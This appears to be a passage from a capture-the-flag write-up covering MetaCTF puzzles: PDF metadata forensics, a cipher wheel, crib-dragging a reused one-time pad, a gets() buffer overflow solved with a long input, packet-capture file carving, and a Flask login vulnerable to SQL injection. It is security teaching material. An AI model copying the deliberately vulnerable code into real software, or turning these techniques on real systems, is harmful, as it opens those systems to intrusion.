&gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 19 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 20 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 18 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /CAAAAA+DejaVuSans</span><br><span class="line">    /Flags 4</span><br><span class="line">    /FontBBox [-1020 -462 1793 1233]</span><br><span class="line">    /ItalicAngle 0</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1232</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 18 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 21 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 458</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 22 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 20 0 R, 21 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /CAAAAA+DejaVuSans</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 53</span><br><span class="line">    /Widths <span class="string">&#x27;[600 751 615 591 317 591 411 611 633 317 294 317 974 392 612 579\n277 634 634 520 634 634 549 352 633 633 277 1000 317 591 774 817\n277 631 988 360 684 686 770 636 636 336 636 610 862 694 524 336\n294 500 557 634 634 603 ]&#x27;</span></span><br><span class="line">    /FontDescriptor 20 0 R</span><br><span class="line">    /ToUnicode 21 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 23 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 24 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 24 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 24704</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 24 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 25 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 23 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /BAAAAA+DejaVuSans-Bold</span><br><span class="line">    /Flags 4</span><br><span class="line">    /FontBBox [-1069 -415 1975 1175]</span><br><span class="line">    /ItalicAngle 0</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1174</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 23 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 26 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 379</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 27 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 25 0 R, 26 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /BAAAAA+DejaVuSans-Bold</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 35</span><br><span class="line">    /Widths <span class="string">&#x27;[600 850 715 678 711 348 637 478 493 715 651 830 695 695 995 695\n695 399 773 715 595 342 715 674 342 836 711 711 592 372 682 665\n732 687 435 379 ]&#x27;</span></span><br><span class="line">    /FontDescriptor 25 0 R</span><br><span class="line">    /ToUnicode 26 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 28 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 27 0 R, 22 0 R, 17 0 R, 12 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /F1 27 0 R</span><br><span class="line">    /F2 22 0 R</span><br><span class="line">    /F3 17 0 R</span><br><span class="line">    /F4 12 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 29 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 28 0 R, 4 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Font 28 0 R</span><br><span class="line">    /XObject</span><br><span class="line">      &lt;&lt;</span><br><span class="line">        /Im4 4 0 R</span><br><span class="line">      &gt;&gt;</span><br><span class="line">    /ProcSet [/PDF/Text/ImageC/ImageI/ImageB]</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 1 0</span><br><span class="line"> Type: /Page</span><br><span class="line"> Referencing: 7 0 R, 29 0 R, 2 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent 7 0 R</span><br><span class="line">    /Resources 29 0 R</span><br><span class="line">    /MediaBox [0 0 612 792]</span><br><span class="line">    /Group</span><br><span class="line">      &lt;&lt;</span><br><span class="line">        /S /Transparency</span><br><span class="line">        /CS /DeviceRGB</span><br><span class="line">        /I <span class="literal">true</span></span><br><span class="line">      &gt;&gt;</span><br><span class="line">    /Contents 2 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 30 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 31 0 R, 31 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Count 1</span><br><span class="line">    /First 31 0 R</span><br><span class="line">    /Last 31 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 31 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 1 0 R, 30 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Count 0</span><br><span class="line">    /Title &lt;FEFF004F00700065006E0020004C0065007400740065007200200062007900200044003300340044004D0030003000350033003A002000410064006400720065007300730069006E00670020004D0065006E00740061006C0020004800650061006C0074006800200069006E00200074006800650020004D007500730069006300200049006E006400750073007400720079&gt;</span><br><span class="line">    /Dest [1 0 R/XYZ 57.8 723.3 0]</span><br><span class="line">    /Parent 30 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 7 0</span><br><span class="line"> Type: /Pages</span><br><span class="line"> Referencing: 29 0 R, 1 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Resources 29 0 R</span><br><span class="line">    /MediaBox [ 0 0 612 792 ]</span><br><span class="line">    /Kids [ 1 0 R ]</span><br><span class="line">    /Count 1</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 32 0</span><br><span class="line"> Type: /Catalog</span><br><span class="line"> Referencing: 7 0 R, 1 0 R, 30 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /Pages 7 0 R</span><br><span class="line">    /OpenAction [1 0 R /XYZ null null 0]</span><br><span class="line">    /Outlines 30 0 R</span><br><span class="line">    /Lang (en-US)</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 33 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Author &lt;FEFF005700720065006E0020004700610069006C006C006100720064&gt;</span><br><span class="line">    /Creator &lt;FEFF005700720069007400650072&gt;</span><br><span class="line">    /Producer &lt;FEFF004F00700065006E004F0066006600690063006500200034002E0031002E00310035&gt;</span><br><span class="line">    /CreationDate <span class="string">&quot;(D:20240611094236-07&#x27;00&#x27;)&quot;</span></span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">xref</span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Size 34</span><br><span class="line">    /Root 32 0 R</span><br><span class="line">    /Info 33 0 R</span><br><span class="line">    /ID [&lt;6A32CEB08765720BBF31DFA7A21F882C&gt;&lt;6A32CEB08765720BBF31DFA7A21F882C&gt;]</span><br><span class="line">    /DocChecksum /08FCFC973F8A3C64A209C049EAE7FE05</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref 123882</span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">&#x27;%%EOF\n&#x27;</span></span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">&#x27;%BeginExifToolUpdate\n&#x27;</span></span><br><span class="line"></span><br><span class="line">obj 32 0</span><br><span class="line"> Type: /Catalog</span><br><span class="line"> Referencing: 7 0 R, 1 0 R, 30 0 R, 34 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /Pages 7 0 R</span><br><span class="line">    /OpenAction [ 1 0 R /XYZ null null 0 ]</span><br><span class="line">    /Outlines 30 0 R</span><br><span class="line">    /Lang (en-US)</span><br><span class="line">    /Metadata 34 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 33 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Author (MetaCTF&#123;Wren_Gaillard&#125;)</span><br><span class="line">    /Creator &lt;FEFF005700720069007400650072&gt;</span><br><span class="line">    /Producer &lt;FEFF004F00700065006E004F0066006600690063006500200034002E0031002E00310035&gt;</span><br><span class="line">    /CreationDate <span class="string">&quot;(D:20240611094236-07&#x27;00&#x27;)&quot;</span></span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 34 0</span><br><span class="line"> Type: /Metadata</span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Metadata</span><br><span class="line">    /Subtype /XML</span><br><span class="line">    /Length 2802</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">xref</span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">&#x27;%EndExifToolUpdate 124767\n&#x27;</span></span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Size 35</span><br><span class="line">    /Root 32 0 R</span><br><span class="line">    /Info 33 0 R</span><br><span class="line">    /ID [&lt;6A32CEB08765720BBF31DFA7A21F882C&gt;&lt;6b32CEB08765720BBF31DFA7A21F882C&gt;]</span><br><span class="line">    /DocChecksum /08FCFC973F8A3C64A209C049EAE7FE05</span><br><span class="line">    /Prev 123882</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref 128031</span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">&#x27;%%EOF\n&#x27;</span></span><br><span class="line"></span><br><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#pdf-parser D34DM0053_Open_Letter_Mental_Health.pdf | grep Meta</span></span><br><span class="line">    /Metadata 34 0 R</span><br><span class="line">    /Author (MetaCTF&#123;Wren_Gaillard&#125;)</span><br><span class="line"> Type: /Metadata</span><br><span class="line">    /Type /Metadata</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>My friend wanted to communicate using a secret cipher.</p>
<p>He gave me the message RKPUYPFCIAKKJMYZZJT along with this wheel:</p>
<p><img src="/img/metactfimage2.png" alt="image.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">outer = string.ascii_uppercase + <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">inner = <span class="string">&quot;COSDHG&#123;QNFUVWLEZYXPTKMR&#125;ABJI&quot;</span></span><br><span class="line"></span><br><span class="line">msg = <span class="string">&quot;RKPUYPFCIAKKJMYZZJT&quot;</span></span><br><span class="line"></span><br><span class="line">def decrypt(msg, outer, inner):</span><br><span class="line">    <span class="keyword">for</span> rotation <span class="keyword">in</span> range(len(outer)):</span><br><span class="line">        rotated_inner = inner[rotation:] + inner[:rotation]</span><br><span class="line">        lookup = dict(zip(outer, rotated_inner))</span><br><span class="line">        decrypted_msg = <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>(lookup[c] <span class="keyword">for</span> c <span class="keyword">in</span> msg)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;META&#x27;</span> <span class="keyword">in</span> decrypted_msg:</span><br><span class="line">            <span class="built_in">print</span>(f<span class="string">&quot;Rotation &#123;rotation&#125;: &#123;decrypted_msg&#125;&quot;</span>)</span><br><span class="line">decrypt(msg, outer, inner)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Rotation 4: METACTF{WHEELYCOOL}</p>
</blockquote>
<hr>
<p>We intercepted some communications by an enemy cyber actor, and we believe it’s possible to break their encryption scheme. We know they’re using some form of a one-time pad, but fatally, they’re reusing the key across all their messages. We know the group likes classical books, with one of the actors recently being into Charles Dickens, but we don’t have much else to go off of.</p>
<p>Please break these communications to get the password they’ve sent each other!</p>
<p>This tool (or a similar one) might come in handy.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">We intercepted some communications by an enemy cyber actor, and we believe it<span class="string">&#x27;s possible to break their encryption scheme. We know they&#x27;</span>re using some form of a one-time pad, but fatally, they<span class="string">&#x27;re reusing the key across all their messages. We know the group likes classical books, with one of the actors recently being into Charles Dickens, but we don&#x27;</span>t have much <span class="keyword">else</span> to go off of. Please <span class="built_in">break</span> these communications to get the password they<span class="string">&#x27;ve sent each other!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encrypted message 1 (hex):</span></span><br><span class="line"><span class="string">e0261e3f44788a669ff87710eb149eba87a9b7ce2abb92b45e862de035485ad02aff59e980e5b0db1657332f202bebb0abe591b6137d93854cddd82ad670caf50431b73fa787741a348e8166791c39ef396c658c1313dac4ac82ff5a948211c9503bb9318376d1a61f45c277ac6ac62e4cdfbf3a40753206b661e4bf4e99575d4253c8feaa6b43eb5b8fc415fa2173c497f0e2573671613aa04d72b5daa5aafcb7fd45850739053965c49016276c733b724e67f976b9ee61a633f95b1286435dc491cec07baf506949f97a56c20870c0b6cfe0e81a96bec40628e407e25d573a35f7c3f9f1af533a363e65b87e7b3948f0d138d2f9e8678e9fc38c83e4202cf00570c386d5fc334314936148efc4fc27db06315d9131fa0455d31e4349a7343ed87f152ace3a1f62552ba00bc36228ef5da754239273453634bdab2a4a6f3c12e3c94b91bbf7c521ca22ff84cb7aac3083a2a252fab727c4f1fcef43d7c32b4f2ba70b32eeefabd1da10980932d3af79c0f8c069ed09f73ef69793ddf7256b6c9473be6ca7907b065e0a0965418fc2daf03abf308c55639d827ea41b4a9a1874b41bfc2cf809083593bda5de46e306e142f9c65716eb1f1670bb8a4367b1920fb5490387b64c9ad105365dd9e812a044a70bfcc5fa6d01ae325aff2db252307c01d54f2d6c8764651a90ab69eb8146ead1c318a952fcd4648764e450f84e7cca18ddb8f0bd0f405a320a3ed8ce79bf0767ea1ed2915664082ad3d7671b59b79b7d9d5a7948952923fc2537fd14a40ac98344fe927adfbf805b39974fb525aeb7dceabcf58c363c04232ede54cfc0f02169ac06293e322d1ccceb1927f3a1c70328226b4dd812ee33df05a1728769167a25e245b58eb5ada6b26b71b0d7cdae8115d950a1824b445fb197e20318d61b69385ff5cc10600419209239735105f3feb09dfcad6b3a42aba213cb997e5cce2e04df6299fefaea04d9fd17819fd24477cf15d1fd0644cafed146175753a166a9344be3a8163fe855c71017b041ef49e2eff087d9de753b4f1518ca989b5f326407f82b0f98ecbdc9b900c075bed589c348d0e0b623658a31ddec507abce8518add4d9b00a847354f000da85303f704e722277102296f2bc62e6a4374d1f9f0ea56923ab84cade47ac393be38adfc67a3db39d29d08e6bc86ab987266618476daba54c678ae48658dc44e37974732347e95448d4b3fd88473df9875304d941f4009accace8bb696c6f266faf681a77b214a35312584c0ef835a0fea60e8eb0b3155908f97601a8596ba846f88ad63c197b266e2730d0b58e3c43262303528e1dbef86</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encrypted message 2 (hex):</span></span><br><span class="line"><span class="string">ee205b29512bc37692fc7706e1479fe98defe3d22aa5d79f3df464ff70461bd765ab54e2c3e0a6d91103722c2a2bf0bfe6ef97e8137788c856c9c563c179dbbc0a38a133e88f3b1a7d94912e671070eb3d23619e0951c2c9e9d6f11d9acc11d8502abe3f9b3fd5ab5652d424f42bc33105c6b96901633516e225b4990d92165c0407cff7aa225fe2028fcc0fa37661d2d4f6ef46367d7f75b74d37facbeab1feb0af429406751f24728bd55f2724617a592141b178fce424ae33b6595d874218fad8ddc06eed506153a02d58d7086bdda1cff6e31897a8da5222e607cb5956223af5d5f9f1af533a362471b82a2f3348f0cb25d0fff573c792c9c9cbff3f69be577cd6cd8ebd320a07937057b8e4b237d1547a5c9866be0e48c65f455dab79309d3c0429cf680971532cab16df7266ee0fac542b9972006120bda77e58667013ecca4b92b1a3de27c920ab8ec772a46287e0b854a2b73bc4a8abf854c7902f0f67e51929a7c8eb9c9e0a9f1e3487fb65ceaca865f858e170bcde8addf9724f708824be79e790700c43431d654283c49fe721bf338c4963bbd673af0a1894097933ff4831fe40087d91aaa28107f00ba40be7835117e15b506ea88a1734aede08b75e0dcb9600939d513c5dd9eb05ab53ab0befc5f36706e73c1ea964b61a37614dc3003760d36323558cad3aae9940ef82da11bb48af95629c63e50eb153618818dda2ebbe03410e341c77c3c93ab71f34be14d68c186d4778d9da67525db79e35ce1c6252d06e2ffc2f63f708f01f8ad117f4c45a93e7c85d22d053a960e7b089edb6f28c33680f306b8959d9c2a23063ac1a2a70356205d4ef4b3ee1bdda54283e6314857d9406c501a772cb675d2814aa41b595bdb0b2e5736aa09f84bc8134dd56a7a43f6845a5c5b20f2392087d2e4da1c7191f441867a57b22411ec0fce883b4f8782409a7cb5bc9d52a46ce6f13df3094f1fca14bd0a826cf8cd10560c45bd1fa014ed6bad13b22760ca14ea92c47e3bb163ce9448f4302f15ffa1beaecf099d0c8217a431e57c0988344777501bd7c0998ecf8dab90bc46fbf9488c70bd3a3e46c72c530bfd9205deeba718c980c9a02a848674d011ba1194d991ee72627770d6c7864c72f3e4168c0aabfed479222bf1fe0fe36c093ba32adb567ae9a2687910efabcc8ead6057a618461ddb100d878b05f36d9c34d37934e24600d824a975a6dc79a658c896f2308814a5b1afec38fca979bdaf264fbfcd5b37d3e51703661c194f7904b5cfb66f5a50f2d1b8d93d86b0ccb87a08023d8bb75c7d0</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://toolbox.lotusfa.com/crib_drag/">https://toolbox.lotusfa.com/crib_drag&#x2F;</a></p>
<p><img src="/img/metactfimage3.png" alt="image.png"></p>
<p><img src="/img/metactfimage4.png" alt="image.png"></p>
<p>可以大概猜測是在某段文字中的其中的文字，找到題目說的那位作者，他應該有個書籍包含了缺失的內容</p>
<p><img src="/img/metactfimage5.png" alt="image.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">It was the best of <span class="built_in">times</span>, it was the worst of <span class="built_in">times</span>, it was the age of wisdom, it was the age of foolishness, it was the epoch of belief, it was the epoch of incredulity, it was the season of Light, it was the season of Darkness, it was the spring of hope, it was the winter of despair, we had everything before us, we had nothing before us, we were all going direct to Heaven, we were all going direct the other way—<span class="keyword">in</span> short, the period was so far like the present period, that some of its noisiest authorities insisted on its being received, <span class="keyword">for</span> good or <span class="keyword">for</span> evil, <span class="keyword">in</span> the superlative degree of comparison only. There were a king with a large jaw and a queen with a plain face, on the throne of England; there were a king with a large jaw and a queen with a fair face, on the throne of France. In both countries it was clearer than crystal to the lords of the State preserves of loaves and fishes, that things <span class="keyword">in</span> general were settled <span class="keyword">for</span> ever.</span><br></pre></td></tr></table></figure>

<p>大概一片猜測之後</p>
<p><img src="/img/metactfimage6.png" alt="image.png"></p>
<blockquote>
<p>MetaCTF{cr1b_dr4gg1ng_7h3_b00k_c1ph3r}</p>
</blockquote>
<hr>
<p>My favorite coffee shop is opening a new website, but they locked it behind a combination lock page! Can you hack the page to get access early?</p>
<p>Access the site <a target="_blank" rel="noopener" href="http://host5.metaproblems.com:7510/">here</a></p>
<p><img src="/img/metactfimage7.png" alt="image.png"></p>
<hr>
<p>StackSmashers<br>Welcome to the buffer overflow challenge!</p>
<p>What is a Buffer Overflow?<br>When a program is executed, the CPU processes instructions stored in memory. A stack is an area within memory that is used to store variables, manage function calls, and help control the flow of the program.</p>
<p>When a program receives data from a user, it is stored on the stack in a “buffer”, which is a designated chunk of memory reserved for that data.</p>
<p>A buffer overflow occurs when more data is written to a buffer than it can hold. This extra data can overwrite adjacent memory, potentially leading to unexpected behavior or security vulnerabilities.</p>
<p>Relevant Source Code<br>Take a look at this program. It asks the user to enter a string that will be stored in the buffer section of the memory struct. Note how the buffer can only store 16 bytes.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">void <span class="function"><span class="title">win</span></span>() &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Congratulations! You&#x27;ve successfully performed a buffer overflow! Here&#x27;s your flag: FLAG_REDACTED_IN_SNIPPET&quot;</span>);</span><br><span class="line">//The flag has been removed from this version of the code, <span class="keyword">in</span> the real running code, it will be printed when this <span class="keyword">function</span> is called</span><br><span class="line">&#125;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">struct &#123;</span><br><span class="line">char buffer[16];</span><br><span class="line">bool winner;</span><br><span class="line">&#125; memory;</span><br><span class="line">memory.winner = <span class="literal">false</span>;</span><br><span class="line">gets(memory.buffer);</span><br><span class="line"><span class="keyword">if</span> (memory.winner) &#123;</span><br><span class="line">win();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>How to Solve the Challenge<br>Your goal is to overflow the buffer and set the winner variable to true. The winner variable is located immediately after the buffer in memory. By providing more than 16 characters of input, you can overwrite the winner variable.</p>
<p>Enter your input below to attempt the buffer overflow:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Submit</span><br><span class="line">Memory layout before input:</span><br><span class="line">0000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">0010  00  </span><br><span class="line"></span><br><span class="line">Enter some data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Memory layout after input:</span><br><span class="line"></span><br><span class="line">0000  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">0010  41       </span><br><span class="line"></span><br><span class="line">Congratulations! You<span class="string">&#x27;ve successfully performed a buffer overflow! Here&#x27;</span>s your flag: MetaCTF&#123;h4ving_fun_m4king_pr0f1t&#125;</span><br><span class="line">                                       .</span><br></pre></td></tr></table></figure>

<p>緩衝區溢出就是…丟一堆字串塞下去就對ㄌ</p>
<p><img src="/img/metactfimage8.png" alt="image.png"></p>
<blockquote>
<p>MetaCTF{h4ving_fun_m4king_pr0f1t}</p>
</blockquote>
<hr>
<p>We captured network traffic of someone connecting to a file share on a server and writing to a few files.</p>
<p>The flag is in the flag.png file. Find it!</p>
<p>Hint: see if you can isolate the RPC requests that are responsible for writing files to the file system, and pull out the payload of the one that writes flag.png. Copy Bytes as Raw Binary might be helpful, but there are other valid approaches too.</p>
<p>找到這邊有寫入的部分</p>
<p><img src="/img/metactfimage9.png" alt="image.png"></p>
<p>如果開啟下面設定能看到更多細節</p>
<p><img src="/img/metactfimage10.png" alt="image.png"></p>
<p><img src="/img/metactfimage11.png" alt="image.png"></p>
<p>PNG檔案的開頭會有一個特定的簽名，89 50 4E 47 0D 0A 1A 0A</p>
<p><img src="/img/metactfimage12.png" alt="image.png"></p>
<p><img src="/img/metactfimage13.png" alt="image.png"></p>
<p><img src="/img/metactfimage14.png" alt="image.png"></p>
<blockquote>
<p>MetaCTF{th3_n3tw0rk_is_th3_c0mput3r}</p>
</blockquote>
<hr>
<p>My friend went camping near some beautiful lake the other day and sent me a photo, but they refuse to tell me where it was!</p>
<p>Can you help me figure out the name of that lake?</p>
<p>Simply enter the name of the lake as the flag. It does not need to be in the MetaCTF{} format.</p>
<p><img src="/img/metactfimage15.png" alt="image.png"></p>
<p><img src="/img/metactfimage16.png" alt="image.png"></p>
<hr>
<p>I’m trying to log into my online crypto wallet, but I forgot my password! There’s no password reset feature, and I can’t reach support.</p>
<p>Can you help me log in and get the flag? My username is jim404.</p>
<p>You can download the source code here. Looks like there might be an issue with how the user input is injected into the SQL query.</p>
<p><img src="/img/metactfimage17.png" alt="image.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, render_template</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sqlite3</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">os.chdir(os.path.dirname(os.path.realpath(__file__)))</span><br><span class="line"></span><br><span class="line">db = sqlite3.connect(<span class="string">&quot;db.sqlite&quot;</span>, check_same_thread=False)</span><br><span class="line">db_cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">@app.route(<span class="string">&#x27;/index.html&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def index():</span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def login():</span><br><span class="line">    data = request.json</span><br><span class="line">    username = data.get(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;-&quot;</span>)</span><br><span class="line">    password_hash = hashlib.md5(data.get(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;-&quot;</span>).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    db_error = <span class="string">&quot;&quot;</span></span><br><span class="line">    try:</span><br><span class="line">        query = <span class="string">&quot;SELECT username, public_btc_address, private_btc_key, balance FROM users WHERE username=&#x27;&quot;</span> + username + <span class="string">&quot;&#x27; AND password_hash=&#x27;&quot;</span> + password_hash + <span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line">        result = db_cursor.execute(query)</span><br><span class="line">        user_data = result.fetchone()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        user_data = None</span><br><span class="line">        db_error = str(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_data is None:</span><br><span class="line">        <span class="built_in">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;error&quot;</span>: True,</span><br><span class="line">            <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Login failed. Please try again.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: query,</span><br><span class="line">            <span class="string">&quot;debug_msg&quot;</span>: db_error,</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;error&quot;</span>: False,</span><br><span class="line">            <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Login successful.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: user_data[0],</span><br><span class="line">            <span class="string">&quot;public_btc_address&quot;</span>: user_data[1],</span><br><span class="line">            <span class="string">&quot;private_btc_key&quot;</span>: user_data[2],</span><br><span class="line">            <span class="string">&quot;balance&quot;</span>: user_data[3]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">app.run(debug=True, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>The SQL query is constructed like this:</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">query = <span class="string">&quot;SELECT username, public_btc_address, private_btc_key, balance FROM users WHERE username=&#x27;&quot;</span> + username + <span class="string">&quot;&#x27; AND password_hash=&#x27;&quot;</span> + password_hash + <span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>User-supplied values (<code>username</code> and <code>password</code>) are concatenated directly into the query string, making it vulnerable to SQL Injection.</li>
</ul>
</li>
